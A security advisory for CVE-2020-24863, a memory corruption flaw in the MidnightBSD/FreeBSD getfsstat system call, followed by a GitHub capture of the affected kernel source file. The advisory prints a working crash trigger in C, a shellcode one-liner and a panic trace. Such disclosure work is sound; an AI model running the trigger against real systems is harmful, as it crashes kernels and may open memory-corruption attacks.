=== Content from www.midnightbsd.org_d740b077_20250119_120800.html ===
Memory Corruption Vulnerability in MidnightBSD Kernel
CVE-2020-24863
INTRODUCTION
A memory corruption vulnerability was found in the latest stable version of
MidnightBSD (also demonstrated to affect previous versions and to potentially
affect other \*BSDs). The vulnerability happens in the kern\_getfsstat().
Back in 2017, Paulo reported the same issue to FreeBSD, but no actions were
taken. Rodrigo independently found it a bit later, but since Paulo had already
reported, no actions were taken. A year later, there was an official errata for
the issue [1], crediting Thomas Barabosch and Fraunhofer FKIE, who independently
Found and report it, finally gaining attention. The problem is the errata wrongly
assume the issue to be a null pointer dereference (likely because of the trigger
at the time), and the fix was therefore incomplete. The issue received CVE-2018-17154.
Indeed, from the diff on the 11.1 [2] a check for buf==NULL was added in line
644. 'buf' was supposedly NULL when an invalid mode was used (and not because
of a malloc allocation failure, since WAITOK guarantees that malloc will always
return a valid memory).
While analyzing why the fix did not make it into the FreeBSD 12 STABLE branch [3] we
tried to first trigger the issue in an older 11-eng kernel. Once we've managed to
do that, we've root caused the issue and managed to trigger it in the latest 11.4
branch as well (see DETAILS section). We believe all versions are affected.
We also found a fix proposed for FreeBSD 12.1 [4] that sets buf to NULL before returning,
and incorporates the check for buf == NULL upon returning. That fix addresses the
issue completely.
CVSSv3 Scoring System
The CVSS score is: 7.4
We have used the following values to calculate the scores:
Base score is: AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
DISCLOSURE PROCESS
We are sharing this advisory to the security teams of:
- FreeBSD
- MidnightBSD
By looking at the source code of OpenBSD,cNetBSD and DragonFlyBSD, they are not
affected (the code is very different). MidnightBSD does not have a
freebsd4\_getfsstat() but the kern\_getfsstat() is the same as in FreeBSD, so we
plan to inform them.
Once we hear from the teams, we plan to update the advisory with more
accurate data (and potentially timelines).
We kindly ask everyone to hold the patches until we hear back from all the
potentially affected BSDs. We intend to have the full cycle of fixes in 90 days,
unless we receive compelling reasons.
TRIGGERING THE PROBLEM
The trigger code is small enough that it fits in the advisory:
----------------- BEGIN crash.c -----------------
#include
#include
int main(void)
{
syscall(18, 0, 305, 9);
return 0;
}
----------------- END crash.c -----------------
DETAILS
We've tested our crash code in the following system:
$ uname -a
FreeBSD host 11.4-RELEASE FreeBSD 11.4-RELEASE #0 r362094: Fri Jun 12 18:27:15 UTC 2020
root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
Essentially if size >= 304 (we've used 305 in the code) and an invalid mode is used (we've
used 9), we have a memory corruption due to a free() that happens in the variable 'buf'
that was never allocated with 'malloc' (but is a pointer to a struct and kern\_getfsstat() is
Responsible to allocate space for it). Since the value for the pointer is uninitialized,
previous kernel stack value is used and the corruption is hard to predict (an attacker is
able to create the right conditions and potentially trigger a free() of a valid object,
leading to a use-after-free scenario in other parts of the kernel).
Notice that the original fix, which checks for buf != NULL only prevents a scenario in which
buf ends up in a stack value that is 0 (likely the original trigger had that condition for
whatever reasons).
Here is a trace of the crash:
Fatal trap 12: page fault while in kernel mode
cpuid =1; apic id = 01
fault virtual address = 0xffff8040000e4198
fault code = supervisor read data, page not present
instruction pointer = 0x20:0xffffffff80f65fa9
stack pointer = 0x28:0xfffffe00002e48f0
frame pointer = 0x28:0xfffffe00002e48f0
code segment = base 0x0, limit 0xfffff, type 0x1b
= DPL 0, pres 1, long 1, def32 0, gran 1
processor eflags = interrupt enabled, resume, IOPL = 0
current process = 1536 (crash)
trao number = 12
panic: page fault
cpuid = 1
KDB: stack backtrace:
#0 0xffffffff80b3d567 at kdb\_backtrace+0x67
#1 0xffffffff80af6b07 at vpanic+0x177
#2 0xffffffff80af6983 at panic+0x43
#3 0xffffffff80f77faf at trap\_fatal+0x35f
#4 0xffffffff80f78009 at trap\_pfault+0x49
#5 0xffffffff80f777d7 at trap+0x2c7
#6 0xffffffff80f5769c at calltrap+0x8
#7 0xffffffff80ad32b0 at free+0x30
#8 0xffffffff80bc1bf9 at freebsd4\_getfsstat+0x119
#9 0xffffffff80f79038 at amd64\_syscall+0xa38
#10 0xffffffff80f57eed at fast\_syscall\_common+0x101
Notice that sometimes the crash is not immediate (due to the non-deterministic stack state
created by our code), but just by playing with the system it will happen. A more
deterministic one is to use the same code with truss:
echo 'const char main[]="\x6a\x12\x58\x31\xff\x54\x5e\x31\xd2\x0f\x05";' | gcc -xc -ocrash - ;truss ./crash
TIMELINE
This timeline will be updated once we start hearing back from the different
teams.
-> Initial disclosure to
FreeBSD/MidnightBSD - 06/19/2020
-> Patched in both FreeBSD (FreeBSD-EN-20:18.getfsstat) and MidnightBSD 1.2.7 and 1.3-CURRENT
CREDITS
This vulnerability was discovered and exploited by Paulo Henrique L. Amorim
(Independent Security Researcher) and Rodrigo Rubira Branco (BSDaemon)
(Amazon Web Services).
REFERENCES
[1] FreeBSD Errata. "NULL pointer dereference in freebsd4\_getfsstat system call".
Link: https://www.freebsd.org/security/advisories/FreeBSD-EN-18:10.syscall.asc
[2] FreeBSD Code Diff. "Diff of /releng/11.1/sys/kern/vfs\_syscalls.c".
Link: https://svnweb.freebsd.org/base/releng/11.1/sys/kern/vfs\_syscalls.c?r1=338979&r2=338978&pathrev=338979
[3] FreeBSD Code. "Stable Branch".
Link: http://fxr.watson.org/fxr/source/kern/vfs\_syscalls.c?v=FREEBSD-12-STABLE#L599
[4] FreeBSD Code Diff. "Diff of /head/sys/kern/vfs\_syscalls.c"
Link: https://svnweb.freebsd.org/base/head/sys/kern/vfs\_syscalls.c?r1=311286&r2=311285&pathrev=311286


=== Content from github.com_1850fa9d_20250119_120805.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMidnightBSD%2Fsrc%2Fblob%2F1691c07ff4f27b97220a5d65e217341e477f4014%2Fsys%2Fkern%2Fvfs_syscalls.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMidnightBSD%2Fsrc%2Fblob%2F1691c07ff4f27b97220a5d65e217341e477f4014%2Fsys%2Fkern%2Fvfs_syscalls.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=MidnightBSD%2Fsrc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MidnightBSD](/MidnightBSD)
/
**[src](/MidnightBSD/src)**
Public

* [Notifications](/login?return_to=%2FMidnightBSD%2Fsrc) You must be signed in to change notification settings
* [Fork
  6](/login?return_to=%2FMidnightBSD%2Fsrc)
* [Star
   59](/login?return_to=%2FMidnightBSD%2Fsrc)

* [Code](/MidnightBSD/src)
* [Issues
  18](/MidnightBSD/src/issues)
* [Pull requests
  0](/MidnightBSD/src/pulls)
* [Discussions](/MidnightBSD/src/discussions)
* [Actions](/MidnightBSD/src/actions)
* [Projects
  0](/MidnightBSD/src/projects)
* [Wiki](/MidnightBSD/src/wiki)
* [Security](/MidnightBSD/src/security)
* [Insights](/MidnightBSD/src/pulse)

Additional navigation options

* [Code](/MidnightBSD/src)
* [Issues](/MidnightBSD/src/issues)
* [Pull requests](/MidnightBSD/src/pulls)
* [Discussions](/MidnightBSD/src/discussions)
* [Actions](/MidnightBSD/src/actions)
* [Projects](/MidnightBSD/src/projects)
* [Wiki](/MidnightBSD/src/wiki)
* [Security](/MidnightBSD/src/security)
* [Insights](/MidnightBSD/src/pulse)

## Files

 1691c07
## Breadcrumbs

1. [src](/MidnightBSD/src/tree/1691c07ff4f27b97220a5d65e217341e477f4014)
2. /[sys](/MidnightBSD/src/tree/1691c07ff4f27b97220a5d65e217341e477f4014/sys)
3. /[kern](/MidnightBSD/src/tree/1691c07ff4f27b97220a5d65e217341e477f4014/sys/kern)
/
# vfs\_syscalls.c

Copy path Blame  Blame
## Latest commit

## History

[History](/MidnightBSD/src/commits/1691c07ff4f27b97220a5d65e217341e477f4014/sys/kern/vfs_syscalls.c)4368 lines (4034 loc) · 94 KB 1691c07
## Breadcrumbs

1. [src](/MidnightBSD/src/tree/1691c07ff4f27b97220a5d65e217341e477f4014)
2. /[sys](/MidnightBSD/src/tree/1691c07ff4f27b97220a5d65e217341e477f4014/sys)
3. /[kern](/MidnightBSD/src/tree/1691c07ff4f27b97220a5d65e217341e477f4014/sys/kern)
/
# vfs\_syscalls.c

Top
## File metadata and controls

* Code
* Blame

4368 lines (4034 loc) · 94 KB[Raw](https://github.com/MidnightBSD/src/raw/1691c07ff4f27b97220a5d65e217341e477f4014/sys/kern/vfs_syscalls.c)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000/\*- \* Copyright (c) 1989, 1993 \* The Regents of the University of California. All rights reserved. \* (c) UNIX System Laboratories, Inc. \* All or some portions of this file are derived from material licensed \* to the University of California by American Telephone and Telegraph \* Co. or Unix System Laboratories, Inc. and are reproduced herein with \* the permission of UNIX System Laboratories, Inc. \* \* Redistribution and use in source and binary forms, with or without \* modification, are permitted provided that the following conditions \* are met: \* 1. Redistributions of source code must retain the above copyright \* notice, this list of conditions and the following disclaimer. \* 2. Redistributions in binary form must reproduce the above copyright \* notice, this list of conditions and the following disclaimer in the \* documentation and/or other materials provided with the distribution. \* 4. Neither the name of the University nor the names of its contributors \* may be used to endorse or promote products derived from this software \* without specific prior written permission. \* \* THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND \* ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \* ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE \* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL \* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS \* OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) \* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT \* LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY \* OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF \* SUCH DAMAGE. \* \* @(#)vfs\_syscalls.c 8.13 (Berkeley) 4/15/94 \*/
#include <sys/cdefs.h>\_\_FBSDID("$FreeBSD: stable/11/sys/kern/vfs\_syscalls.c 338987 2018-09-27 18:54:41Z gordon $");
#include "opt\_capsicum.h"#include "opt\_compat.h"#include "opt\_ktrace.h"
#include <sys/param.h>#include <sys/systm.h>#include <sys/bio.h>#include <sys/buf.h>#include <sys/capsicum.h>#include <sys/disk.h>#include <sys/sysent.h>#include <sys/malloc.h>#include <sys/mount.h>#include <sys/mutex.h>#include <sys/sysproto.h>#include <sys/namei.h>#include <sys/filedesc.h>#include <sys/kernel.h>#include <sys/fcntl.h>#include <sys/file.h>#include <sys/filio.h>#include <sys/limits.h>#include <sys/linker.h>#include <sys/rwlock.h>#include <sys/sdt.h>#include <sys/stat.h>#include <sys/sx.h>#include <sys/unistd.h>#include <sys/vnode.h>#include <sys/priv.h>#include <sys/proc.h>#include <sys/dirent.h>#include <sys/jail.h>#include <sys/syscallsubr.h>#include <sys/sysctl.h>#ifdef KTRACE#include <sys/ktrace.h>#endif
#include <machine/stdarg.h>
#include <security/audit/audit.h>#include <security/mac/mac\_framework.h>
#include <vm/vm.h>#include <vm/vm\_object.h>#include <vm/vm\_page.h>#include <vm/uma.h>
#include <ufs/ufs/quota.h>
MALLOC\_DEFINE(M\_FADVISE, "fadvise", "posix\_fadvise(2) information");
SDT\_PROVIDER\_DEFINE(vfs);SDT\_PROBE\_DEFINE2(vfs, , stat, mode, "char \*", "int");SDT\_PROBE\_DEFINE2(vfs, , stat, reg, "char \*", "int");
static int kern\_chflagsat(struct thread \*td, int fd, const char \*path, enum uio\_seg pathseg, u\_long flags, int atflag);static int setfflags(struct thread \*td, struct vnode \*, u\_long);static int getutimes(const struct timeval \*, enum uio\_seg, struct timespec \*);static int getutimens(const struct timespec \*, enum uio\_seg, struct timespec \*, int \*);static int setutimes(struct thread \*td, struct vnode \*, const struct timespec \*, int, int);static int vn\_access(struct vnode \*vp, int user\_flags, struct ucred \*cred, struct thread \*td);
/\* \* Sync each mounted filesystem. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct sync\_args { int dummy;};#endif/\* ARGSUSED \*/intsys\_sync(struct thread \*td, struct sync\_args \*uap){ struct mount \*mp, \*nmp; int save;
 mtx\_lock(&mountlist\_mtx); for (mp = TAILQ\_FIRST(&mountlist); mp != NULL; mp = nmp) { if (vfs\_busy(mp, MBF\_NOWAIT | MBF\_MNTLSTLOCK)) { nmp = TAILQ\_NEXT(mp, mnt\_list); continue; } if ((mp->mnt\_flag & MNT\_RDONLY) == 0 && vn\_start\_write(NULL, &mp, V\_NOWAIT) == 0) { save = curthread\_pflags\_set(TDP\_SYNCIO); vfs\_msync(mp, MNT\_NOWAIT); VFS\_SYNC(mp, MNT\_NOWAIT); curthread\_pflags\_restore(save); vn\_finished\_write(mp); } mtx\_lock(&mountlist\_mtx); nmp = TAILQ\_NEXT(mp, mnt\_list); vfs\_unbusy(mp); } mtx\_unlock(&mountlist\_mtx); return (0);}
/\* \* Change filesystem quotas. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct quotactl\_args { char \*path; int cmd; int uid; caddr\_t arg;};#endifintsys\_quotactl(struct thread \*td, struct quotactl\_args \*uap){ struct mount \*mp; struct nameidata nd; int error;
 AUDIT\_ARG\_CMD(uap->cmd); AUDIT\_ARG\_UID(uap->uid); if (!prison\_allow(td->td\_ucred, PR\_ALLOW\_QUOTAS)) return (EPERM); NDINIT(&nd, LOOKUP, FOLLOW | LOCKLEAF | AUDITVNODE1, UIO\_USERSPACE, uap->path, td); if ((error = namei(&nd)) != 0) return (error); NDFREE(&nd, NDF\_ONLY\_PNBUF); mp = nd.ni\_vp->v\_mount; vfs\_ref(mp); vput(nd.ni\_vp); error = vfs\_busy(mp, 0); vfs\_rel(mp); if (error != 0) return (error); error = VFS\_QUOTACTL(mp, uap->cmd, uap->uid, uap->arg);
 /\* \* Since quota on operation typically needs to open quota \* file, the Q\_QUOTAON handler needs to unbusy the mount point \* before calling into namei. Otherwise, unmount might be \* started between two vfs\_busy() invocations (first is our, \* second is from mount point cross-walk code in lookup()), \* causing deadlock. \* \* Require that Q\_QUOTAON handles the vfs\_busy() reference on \* its own, always returning with ubusied mount point. \*/ if ((uap->cmd >> SUBCMDSHIFT) != Q\_QUOTAON && (uap->cmd >> SUBCMDSHIFT) != Q\_QUOTAOFF) vfs\_unbusy(mp); return (error);}
/\* \* Used by statfs conversion routines to scale the block size up if \* necessary so that all of the block counts are <= 'max\_size'. Note \* that 'max\_size' should be a bitmask, i.e. 2^n - 1 for some non-zero \* value of 'n'. \*/voidstatfs\_scale\_blocks(struct statfs \*sf, long max\_size){ uint64\_t count; int shift;
 KASSERT(powerof2(max\_size + 1), ("%s: invalid max\_size", \_\_func\_\_));
 /\* \* Attempt to scale the block counts to give a more accurate \* overview to userland of the ratio of free space to used \* space. To do this, find the largest block count and compute \* a divisor that lets it fit into a signed integer <= max\_size. \*/ if (sf->f\_bavail < 0) count = -sf->f\_bavail; else count = sf->f\_bavail; count = MAX(sf->f\_blocks, MAX(sf->f\_bfree, count)); if (count <= max\_size) return;
 count >>= flsl(max\_size); shift = 0; while (count > 0) { shift++; count >>=1; }
 sf->f\_bsize <<= shift; sf->f\_blocks >>= shift; sf->f\_bfree >>= shift; sf->f\_bavail >>= shift;}
static intkern\_do\_statfs(struct thread \*td, struct mount \*mp, struct statfs \*buf){ struct statfs \*sp; int error;
 if (mp == NULL) return (EBADF); error = vfs\_busy(mp, 0); vfs\_rel(mp); if (error != 0) return (error);#ifdef MAC error = mac\_mount\_check\_stat(td->td\_ucred, mp); if (error != 0) goto out;#endif /\* \* Set these in case the underlying filesystem fails to do so. \*/ sp = &mp->mnt\_stat; sp->f\_version = STATFS\_VERSION; sp->f\_namemax = NAME\_MAX; sp->f\_flags = mp->mnt\_flag & MNT\_VISFLAGMASK; error = VFS\_STATFS(mp, sp); if (error != 0) goto out; \*buf = \*sp; if (priv\_check(td, PRIV\_VFS\_GENERATION)) { buf->f\_fsid.val[0] = buf->f\_fsid.val[1] = 0; prison\_enforce\_statfs(td->td\_ucred, mp, buf); }out: vfs\_unbusy(mp); return (error);}
/\* \* Get filesystem statistics. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct statfs\_args { char \*path; struct statfs \*buf;};#endifintsys\_statfs(struct thread \*td, struct statfs\_args \*uap){ struct statfs \*sfp; int error;
 sfp = malloc(sizeof(struct statfs), M\_STATFS, M\_WAITOK); error = kern\_statfs(td, uap->path, UIO\_USERSPACE, sfp); if (error == 0) error = copyout(sfp, uap->buf, sizeof(struct statfs)); free(sfp, M\_STATFS); return (error);}
intkern\_statfs(struct thread \*td, char \*path, enum uio\_seg pathseg, struct statfs \*buf){ struct mount \*mp; struct nameidata nd; int error;
 NDINIT(&nd, LOOKUP, FOLLOW | LOCKSHARED | LOCKLEAF | AUDITVNODE1, pathseg, path, td); error = namei(&nd); if (error != 0) return (error); mp = nd.ni\_vp->v\_mount; vfs\_ref(mp); NDFREE(&nd, NDF\_ONLY\_PNBUF); vput(nd.ni\_vp); return (kern\_do\_statfs(td, mp, buf));}
/\* \* Get filesystem statistics. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct fstatfs\_args { int fd; struct statfs \*buf;};#endifintsys\_fstatfs(struct thread \*td, struct fstatfs\_args \*uap){ struct statfs \*sfp; int error;
 sfp = malloc(sizeof(struct statfs), M\_STATFS, M\_WAITOK); error = kern\_fstatfs(td, uap->fd, sfp); if (error == 0) error = copyout(sfp, uap->buf, sizeof(struct statfs)); free(sfp, M\_STATFS); return (error);}
intkern\_fstatfs(struct thread \*td, int fd, struct statfs \*buf){ struct file \*fp; struct mount \*mp; struct vnode \*vp; cap\_rights\_t rights; int error;
 AUDIT\_ARG\_FD(fd); error = getvnode(td, fd, cap\_rights\_init(&rights, CAP\_FSTATFS), &fp); if (error != 0) return (error); vp = fp->f\_vnode; vn\_lock(vp, LK\_SHARED | LK\_RETRY);#ifdef AUDIT AUDIT\_ARG\_VNODE1(vp);#endif mp = vp->v\_mount; if (mp != NULL) vfs\_ref(mp); VOP\_UNLOCK(vp, 0); fdrop(fp, td); return (kern\_do\_statfs(td, mp, buf));}
/\* \* Get statistics on all filesystems. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct getfsstat\_args { struct statfs \*buf; long bufsize; int mode;};#endifintsys\_getfsstat(struct thread \*td, struct getfsstat\_args \*uap){ size\_t count; int error;
 if (uap->bufsize < 0 || uap->bufsize > SIZE\_MAX) return (EINVAL); error = kern\_getfsstat(td, &uap->buf, uap->bufsize, &count, UIO\_USERSPACE, uap->mode); if (error == 0) td->td\_retval[0] = count; return (error);}
/\* \* If (bufsize > 0 && bufseg == UIO\_SYSSPACE) \* The caller is responsible for freeing memory which will be allocated \* in '\*buf'. \*/intkern\_getfsstat(struct thread \*td, struct statfs \*\*buf, size\_t bufsize, size\_t \*countp, enum uio\_seg bufseg, int mode){ struct mount \*mp, \*nmp; struct statfs \*sfsp, \*sp, \*sptmp, \*tofree; size\_t count, maxcount; int error;
 switch (mode) { case MNT\_WAIT: case MNT\_NOWAIT: break; default: return (EINVAL); }restart: maxcount = bufsize / sizeof(struct statfs); if (bufsize == 0) { sfsp = NULL; tofree = NULL; } else if (bufseg == UIO\_USERSPACE) { sfsp = \*buf; tofree = NULL; } else /\* if (bufseg == UIO\_SYSSPACE) \*/ { count = 0; mtx\_lock(&mountlist\_mtx); TAILQ\_FOREACH(mp, &mountlist, mnt\_list) { count++; } mtx\_unlock(&mountlist\_mtx); if (maxcount > count) maxcount = count; tofree = sfsp = \*buf = malloc(maxcount \* sizeof(struct statfs), M\_STATFS, M\_WAITOK); } count = 0; mtx\_lock(&mountlist\_mtx); for (mp = TAILQ\_FIRST(&mountlist); mp != NULL; mp = nmp) { if (prison\_canseemount(td->td\_ucred, mp) != 0) { nmp = TAILQ\_NEXT(mp, mnt\_list); continue; }#ifdef MAC if (mac\_mount\_check\_stat(td->td\_ucred, mp) != 0) { nmp = TAILQ\_NEXT(mp, mnt\_list); continue; }#endif if (mode == MNT\_WAIT) { if (vfs\_busy(mp, MBF\_MNTLSTLOCK) != 0) { /\* \* If vfs\_busy() failed, and MBF\_NOWAIT \* wasn't passed, then the mp is gone. \* Furthermore, because of MBF\_MNTLSTLOCK, \* the mountlist\_mtx was dropped. We have \* no other choice than to start over. \*/ mtx\_unlock(&mountlist\_mtx); free(tofree, M\_STATFS); goto restart; } } else { if (vfs\_busy(mp, MBF\_NOWAIT | MBF\_MNTLSTLOCK) != 0) { nmp = TAILQ\_NEXT(mp, mnt\_list); continue; } } if (sfsp != NULL && count < maxcount) { sp = &mp->mnt\_stat; /\* \* Set these in case the underlying filesystem \* fails to do so. \*/ sp->f\_version = STATFS\_VERSION; sp->f\_namemax = NAME\_MAX; sp->f\_flags = mp->mnt\_flag & MNT\_VISFLAGMASK; /\* \* If MNT\_NOWAIT is specified, do not refresh \* the fsstat cache. \*/ if (mode != MNT\_NOWAIT) { error = VFS\_STATFS(mp, sp); if (error != 0) { mtx\_lock(&mountlist\_mtx); nmp = TAILQ\_NEXT(mp, mnt\_list); vfs\_unbusy(mp); continue; } } if (priv\_check(td, PRIV\_VFS\_GENERATION)) { sptmp = malloc(sizeof(struct statfs), M\_STATFS, M\_WAITOK); \*sptmp = \*sp; sptmp->f\_fsid.val[0] = sptmp->f\_fsid.val[1] = 0; prison\_enforce\_statfs(td->td\_ucred, mp, sptmp); sp = sptmp; } else sptmp = NULL; if (bufseg == UIO\_SYSSPACE) { bcopy(sp, sfsp, sizeof(\*sp)); free(sptmp, M\_STATFS); } else /\* if (bufseg == UIO\_USERSPACE) \*/ { error = copyout(sp, sfsp, sizeof(\*sp)); free(sptmp, M\_STATFS); if (error != 0) { vfs\_unbusy(mp); return (error); } } sfsp++; } count++; mtx\_lock(&mountlist\_mtx); nmp = TAILQ\_NEXT(mp, mnt\_list); vfs\_unbusy(mp); } mtx\_unlock(&mountlist\_mtx); if (sfsp != NULL && count > maxcount) \*countp = maxcount; else \*countp = count; return (0);}
#ifdef COMPAT\_FREEBSD4/\* \* Get old format filesystem statistics. \*/static void cvtstatfs(struct statfs \*, struct ostatfs \*);
#ifndef \_SYS\_SYSPROTO\_H\_struct freebsd4\_statfs\_args { char \*path; struct ostatfs \*buf;};#endifintfreebsd4\_statfs(struct thread \*td, struct freebsd4\_statfs\_args \*uap){ struct ostatfs osb; struct statfs \*sfp; int error;
 sfp = malloc(sizeof(struct statfs), M\_STATFS, M\_WAITOK); error = kern\_statfs(td, uap->path, UIO\_USERSPACE, sfp); if (error == 0) { cvtstatfs(sfp, &osb); error = copyout(&osb, uap->buf, sizeof(osb)); } free(sfp, M\_STATFS); return (error);}
/\* \* Get filesystem statistics. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct freebsd4\_fstatfs\_args { int fd; struct ostatfs \*buf;};#endifintfreebsd4\_fstatfs(struct thread \*td, struct freebsd4\_fstatfs\_args \*uap){ struct ostatfs osb; struct statfs \*sfp; int error;
 sfp = malloc(sizeof(struct statfs), M\_STATFS, M\_WAITOK); error = kern\_fstatfs(td, uap->fd, sfp); if (error == 0) { cvtstatfs(sfp, &osb); error = copyout(&osb, uap->buf, sizeof(osb)); } free(sfp, M\_STATFS); return (error);}
/\* \* Get statistics on all filesystems. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct freebsd4\_getfsstat\_args { struct ostatfs \*buf; long bufsize; int mode;};#endifintfreebsd4\_getfsstat(struct thread \*td, struct freebsd4\_getfsstat\_args \*uap){ struct statfs \*buf, \*sp; struct ostatfs osb; size\_t count, size; int error;
 if (uap->bufsize < 0) return (EINVAL); count = uap->bufsize / sizeof(struct ostatfs); if (count > SIZE\_MAX / sizeof(struct statfs)) return (EINVAL); size = count \* sizeof(struct statfs); error = kern\_getfsstat(td, &buf, size, &count, UIO\_SYSSPACE, uap->mode); if (buf == NULL) return (EINVAL); td->td\_retval[0] = count; if (size != 0) { sp = buf; while (count != 0 && error == 0) { cvtstatfs(sp, &osb); error = copyout(&osb, uap->buf, sizeof(osb)); sp++; uap->buf++; count--; } free(buf, M\_STATFS); } return (error);}
/\* \* Implement fstatfs() for (NFS) file handles. \*/#ifndef \_SYS\_SYSPROTO\_H\_struct freebsd4\_fhstatfs\_args { struct fhandle \*u\_fhp; struct ostatfs \*buf;};#endifintfreebsd4\_fhstatfs(struct thread \*td, struct freebsd4\_fhstatfs\_args \*uap){ struct ostatfs osb; struct statfs \*sfp; fhandle\_t fh; int error;
